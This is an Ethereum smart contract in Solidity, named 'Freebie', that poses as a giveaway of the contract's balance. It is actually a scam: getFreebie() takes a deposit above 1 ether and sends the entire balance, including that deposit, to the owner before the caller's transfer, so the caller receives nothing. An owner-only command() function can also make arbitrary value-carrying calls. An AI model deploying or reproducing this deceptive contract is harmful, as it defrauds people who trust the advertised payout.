pragma solidity ^0.4.19;

contract Freebie {
    address public owner;

    function Freebie() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        require(msg.value > 1 ether);
        owner.transfer(this.balance);
        msg.sender.transfer(this.balance);
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner = 0x0;
        msg.sender.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0));
        require(adr.call.value(msg.value)(data));
    }
}